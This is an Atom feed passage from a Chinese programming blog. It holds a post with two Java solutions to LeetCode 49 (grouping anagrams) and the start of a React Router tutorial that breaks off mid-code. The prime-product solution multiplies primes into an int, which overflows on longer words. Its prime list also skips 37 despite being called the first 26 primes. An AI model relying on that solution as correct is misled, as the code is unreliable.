    <category term="找工作" scheme="https://virgilchen97.github.io/categories/%E6%89%BE%E5%B7%A5%E4%BD%9C/"/>
    
    
    <category term="设计模式" scheme="https://virgilchen97.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>49-字母异位词分组</title>
    <link href="https://virgilchen97.github.io/2020/06/49-%E5%AD%97%E6%AF%8D%E5%BC%82%E4%BD%8D%E8%AF%8D%E5%88%86%E7%BB%84/"/>
    <id>https://virgilchen97.github.io/2020/06/49-%E5%AD%97%E6%AF%8D%E5%BC%82%E4%BD%8D%E8%AF%8D%E5%88%86%E7%BB%84/</id>
    <published>2020-06-27T14:48:20.000Z</published>
    <updated>2022-01-26T13:48:43.537Z</updated>
    
    <content type="html"><![CDATA[<p>给定一个字符串数组，将字母异位词组合在一起。字母异位词指字母相同，但排列不同的字符串。</p><p><strong>示例:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入: [&quot;eat&quot;, &quot;tea&quot;, &quot;tan&quot;, &quot;ate&quot;, &quot;nat&quot;, &quot;bat&quot;]</span><br><span class="line">输出:</span><br><span class="line">[</span><br><span class="line">  [&quot;ate&quot;,&quot;eat&quot;,&quot;tea&quot;],</span><br><span class="line">  [&quot;nat&quot;,&quot;tan&quot;],</span><br><span class="line">  [&quot;bat&quot;]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><strong>说明：</strong></p><ul><li>所有输入均为小写字母。</li><li>不考虑答案输出的顺序。</li></ul><span id="more"></span><h1 id="方法1哈希"><a class="markdownIt-Anchor" href="#方法1哈希"></a> 方法1：哈希</h1><p>我们可以找到一种哈希的方法，使得不同的字母异位词的哈希结果始终相同，而非字母异位词的编码结果不同。这样我们就可以通过这一段编码来给字母异位词分类。</p><p>乍一听这种方法很难理解，实际上很简单。区分字母异位词的显著特征就是不同字母出现的数量。因此我们可以做如下的操作：</p><ol><li>遍历一遍这个单词，统计每个字母出现的频率。</li><li>通过 <code>&#123;字母1&#125;&#123;出现次数&#125;&#123;字母2&#125;&#123;出现次数&#125;...</code> 的方法编码产生一个字符串</li></ol><p>这样的话所有字母异位词的编码结果始终相同。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;String&gt;&gt; groupAnagrams(String[] strs) &#123;</span><br><span class="line">        Map&lt;String, List&lt;String&gt;&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(String str:strs)&#123;</span><br><span class="line">            <span class="comment">// 统计字幕出现频率</span></span><br><span class="line">            <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">26</span>];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">char</span> a:str.toCharArray())&#123;</span><br><span class="line">                arr[a - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 编码当前单词</span></span><br><span class="line">            StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++)&#123;</span><br><span class="line">                sb.append(arr[i]).append((<span class="keyword">char</span>)(i+<span class="string">&#x27;a&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 根据编码将字母异位词归类</span></span><br><span class="line">            String key = sb.toString();</span><br><span class="line">            <span class="keyword">if</span>(map.containsKey(key))&#123;</span><br><span class="line">                map.get(key).add(str);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">                list.add(str);</span><br><span class="line">                map.put(key, list);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ArrayList&lt;&gt;(map.values());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="方法2哈希2"><a class="markdownIt-Anchor" href="#方法2哈希2"></a> 方法2：哈希2</h1><p>我们的目标依然是找到一种哈希的方法，使得不同的字母异位词的哈希结果始终相同。这次我们使用质数的乘积来实现。</p><p>我们用前26个质数分别表示26个字母，而一个单词则反应成他们所代表的质数的乘积。若两个单词是字母异位词，那么他们乘积的结果一定相同，如果不是，那么他们的乘积一定不同：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;String&gt;&gt; groupAnagrams(String[] strs) &#123;</span><br><span class="line">        HashMap&lt;Integer, List&lt;String&gt;&gt; hash = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="comment">//每个字母对应一个质数</span></span><br><span class="line">        <span class="keyword">int</span>[] prime = &#123; <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">41</span>, <span class="number">43</span>, <span class="number">47</span>, <span class="number">53</span>, <span class="number">59</span>, <span class="number">61</span>, <span class="number">67</span>, <span class="number">71</span>, <span class="number">73</span>, <span class="number">79</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">97</span>, <span class="number">101</span>, <span class="number">103</span> &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; strs.length; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> key = <span class="number">1</span>;</span><br><span class="line">            <span class="comment">//累乘得到 key</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; strs[i].length(); j++) &#123;</span><br><span class="line">                key *= prime[strs[i].charAt(j) - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">if</span> (hash.containsKey(key)) &#123;</span><br><span class="line">                hash.get(key).add(strs[i]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                List&lt;String&gt; temp = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">                temp.add(strs[i]);</span><br><span class="line">                hash.put(key, temp);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ArrayList&lt;List&lt;String&gt;&gt;(hash.values());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;给定一个字符串数组，将字母异位词组合在一起。字母异位词指字母相同，但排列不同的字符串。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;示例:&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;输入: [&amp;quot;eat&amp;quot;, &amp;quot;tea&amp;quot;, &amp;quot;tan&amp;quot;, &amp;quot;ate&amp;quot;, &amp;quot;nat&amp;quot;, &amp;quot;bat&amp;quot;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;输出:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  [&amp;quot;ate&amp;quot;,&amp;quot;eat&amp;quot;,&amp;quot;tea&amp;quot;],&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  [&amp;quot;nat&amp;quot;,&amp;quot;tan&amp;quot;],&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  [&amp;quot;bat&amp;quot;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;说明：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;所有输入均为小写字母。&lt;/li&gt;
&lt;li&gt;不考虑答案输出的顺序。&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="LeetCode" scheme="https://virgilchen97.github.io/categories/LeetCode/"/>
    
    
  </entry>
  
  <entry>
    <title>React Router 学习</title>
    <link href="https://virgilchen97.github.io/2020/06/React-Router-%E5%AD%A6%E4%B9%A0/"/>
    <id>https://virgilchen97.github.io/2020/06/React-Router-%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-06-26T08:03:51.000Z</published>
    <updated>2022-01-26T13:48:43.537Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h1><p>引用中文文档中的介绍：</p><blockquote><p>React Router 是一个基于React 之上的强大路由库，它可以让你向应用中快速地添加视图和数据流，同时保持页面与URL 间的同步。</p></blockquote><p>也就是说使用了 React router，我们就可以通过URL来实现组件的展示与跳转。安装 React router 很简单，只需要：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install react-router-dom --save</span><br></pre></td></tr></table></figure><span id="more"></span><h1 id="快速上手"><a class="markdownIt-Anchor" href="#快速上手"></a> 快速上手</h1><h2 id="基本使用"><a class="markdownIt-Anchor" href="#基本使用"></a> 基本使用</h2><p>首先我们使用 <code>create-react-app</code> 快速创建一个React单页应用，在你想要创建项目的目录执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx create-react-app &lt;项目名称&gt;</span><br></pre></td></tr></table></figure><p>首先创建一个 component 文件夹，在文件夹内创建 AppRouter.js，首先我们引入所有需要的包：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  BrowserRouter <span class="keyword">as</span> Router,</span><br><span class="line">  Switch,</span><br><span class="line">  Route,</span><br><span class="line">  Link</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;react-router-dom&#x27;</span></span><br></pre></td></tr></table></figure><p>然后编写 AppRouter 组件本体：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> AppRouter = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">Router</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">nav</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">              <span class="tag">&lt;<span class="name">Link</span> <span class="attr">to</span>=<span class="string">&quot;/&quot;</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">Link</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">              <span class="tag">&lt;<span class="name">Link</span> <span class="attr">to</span>=<span class="string">&quot;/about&quot;</span>&gt;</span>About<span class="tag">&lt;/<span class="name">Link</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">              <span class="tag">&lt;<span class="name">Link</span> <span class="attr">to</span>=<span class="string">&quot;/Users&quot;</span>&gt;</span>Users<span class="tag">&lt;/<span class="name">Link</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">Switch</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;/about&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">About</span> /&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;/<span class="name">Route</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;/Users&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">Users</span> /&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;/<span class="name">Route</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">Home</span> /&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;/<span class="name">Route</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">Switch</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">Router</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后创建 <code>Home</code>，<code>About</code>，<code>User</code> 这三个组件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> About = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>About<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Home = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Users = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Users<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后别忘了：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> AppRouter</span><br></pre></td></tr></table></figure><p>然后修改 App.js 删除除了import以外所有默认内容，在主页展示我们写好的 AppRouter组件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">App</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">AppRouter</span> /&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> App;</span><br></pre></td></tr></table></figure><p>现在执行 <code>npm start</code>，观察运行效果。发现点击链接时浏览器的 URL 栏也会一起改变，但是实际上我们并没有加载任何新的 HTML 页面，这还是一个单页应用。</p><h2 id="nested-routing"><a class="markdownIt-Anchor" href="#nested-routing"></a> Nested Routing</h2><p>上一个例子展示了一个简单的路由，同样的我们也可以实现多级路由。对 AppRouter.js 进行修改，首先添加几个应用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  BrowserRouter <span class="keyword">as</span> Router,</span><br><span class="line">  Switch,</span><br><span class="line">  Route,</span><br><span class="line">  Link,</span><br><span class="line">  useRouteMatch,</span><br><span class="line">  useParams</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&quot;react-router-dom&quot;</span>;</span><br></pre></td></tr></table></figure><p>接着修改 AppRouter.js 下的 User：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Users = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 通过 Hook 获取 match</span></span><br><span class="line">  <span class="keyword">let</span> match = useRouteMatch()</span><br><span class="line">  <span class="keyword">let</span> users = [<span class="string">&#x27;Alice&#x27;</span>, <span class="string">&#x27;Bob&#x27;</span>,<span class="string">&#x27;Jimmy&#x27;</span>]</span><br><span class="line">  <span class="built_in">console</span>.log(match)</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Users<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml">        &#123;/*在User上循环输出链接*/&#125;</span></span><br><span class="line"><span class="xml">        &#123;users.map(user =&gt; &#123;</span></span><br><span class="line"><span class="xml">          return (</span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&#123;user&#125;</span> &gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">Link</span> <span class="attr">to</span>=<span class="string">&#123;</span>`$&#123;<span class="attr">match.url</span>&#125;/$&#123;<span class="attr">user</span>&#125;`&#125;&gt;</span>&#123;user&#125;<span class="tag">&lt;/<span class="name">Link</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">        )&#125;)&#125;</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">Switch</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&#123;</span>`$&#123;<span class="attr">match.path</span>&#125;/<span class="attr">:userId</span>`&#125;&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">User</span> /&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">Route</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&#123;</span>`$&#123;<span class="attr">match.path</span>&#125;`&#125;&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Please select a user<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">Route</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">Switch</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后添加一个新的User组件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> User = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 通过 Hook 获取 路径变量</span></span><br><span class="line">  <span class="keyword">let</span> &#123; userId &#125; = useParams();</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>User name: &#123;userId&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新运行项目，选择不同的 user，浏览器路径也会跟随变化：</p><p><img src="/img/(2020-06-26)React-Router-%E5%AD%A6%E4%B9%A0.md/2020-06-26-17-08-14.png" alt="" /></p><h1 id="开始"><a class="markdownIt-Anchor" href="#开始"></a> 开始</h1><h2 id="url-参数"><a class="markdownIt-Anchor" href="#url-参数"></a> URL 参数</h2><p>在刚才的例子中我们已经接触到了 URL 参数，在 <code>Users</code> 组件中，<code>&lt;Route&gt;</code> 标签内的 path 不再是一个固定值，而是类似如下的格式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> match = useRouteMatch()</span><br><span class="line">&lt;Route path=&#123;<span class="string">`<span class="subst">$&#123;match.path&#125;</span>/:userId`</span>&#125;&gt;</span><br><span class="line">  <span class="xml"><span class="tag">&lt;<span class="name">User</span> /&gt;</span></span></span><br><span class="line">&lt;/Route&gt;</span><br></pre></td></tr></table></figure><p>在 js 中 “`” 代表的是模板字符串，也就是说这里的 <code>path</code> 是 <code>match.path</code> 的值拼接上 <code>/:userId</code>。<code>match</code> 是什么现在先不管，这里 <code>/:userId</code> 就是一个 URL 参数。因此在这个 <code>&lt;Route&gt;</code> 标签内包裹的 <code>&lt;User /&gt;</code> 组件便可以通过 <code>useParams()</code> 这个 hook 获取 <code>userId</code> 的值：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123; userId &#125; = useParams();</span><br></pre></td></tr></table></figure><h2 id="嵌套路由"><a class="markdownIt-Anchor" href="#嵌套路由"></a> 嵌套路由</h2><p>在应用中 URL 肯定不止同一层级，例如可能会有一个管理用户的界面是 <code>/Users</code>，当需要查看或修改某一个用户时，界面可能是 <code>/Users/&#123;userId&#125;</code>。React Router很好的支持了嵌套路由。在之前的例子中，我们使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> match = useRouteMatch()</span><br></pre></td></tr></table></figure><p>获取了一个 match 对象，match对象有两个很重要的属性 <code>path</code> 和 <code>url</code>。这两个属性告诉了我们当前组件的路径是什么。例如之前的例子，主 router 存在于 <code>AppRouter</code> 组件中，<code>User</code> 组件嵌套在 <code>AppRouter</code> 组件的一个 route 里，地址为 <code>/Users</code>。因此在 <code>User</code> 组件中我们使用 <code>useRouteMatch()</code> hook 获取 match 时，match 对象内的值为：</p><p><img src="/img/(2020-06-26)React-Router-%E5%AD%A6%E4%B9%A0.md/2020-06-26-17-35-00.png" alt="" /></p><p>因此在编写 <code>User</code> 组件内部的 route 时，我们只需要取出 <code>match</code> 中的 <code>path</code>，然后拼接上下一步的路径即可：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Route path=&#123;<span class="string">`<span class="subst">$&#123;match.path&#125;</span>/:userId`</span>&#125;&gt;</span><br></pre></td></tr></table></figure><p>那么 <code>path</code> 和 <code>url</code> 有什么区别呢？在路径中全部为静态路径并且没有匹配规则时，两者的值是相同的。但是一旦包含变量或者匹配规则，<code>url</code> 显示的是现在具体的路径，而 <code>path</code> 包含的则当前的路径匹配规则。我们还是通过上面的例子来解释。在 <code>Users</code> 组件路由到 <code>User</code> 组件时，我们是这样写的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Route path=&#123;<span class="string">`<span class="subst">$&#123;match.path&#125;</span>/:userId`</span>&#125;&gt;</span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">User</span> /&gt;</span></span></span><br><span class="line">&lt;/Route&gt;</span><br></pre></td></tr></table></figure><p>现在我们修改 User，让其在终端输出 <code>match</code> 的值:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> User = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 通过 Hook 获取 路径变量</span></span><br><span class="line">  <span class="keyword">let</span> &#123; userId &#125; = useParams();</span><br><span class="line">  <span class="keyword">let</span> match = useRouteMatch();</span><br><span 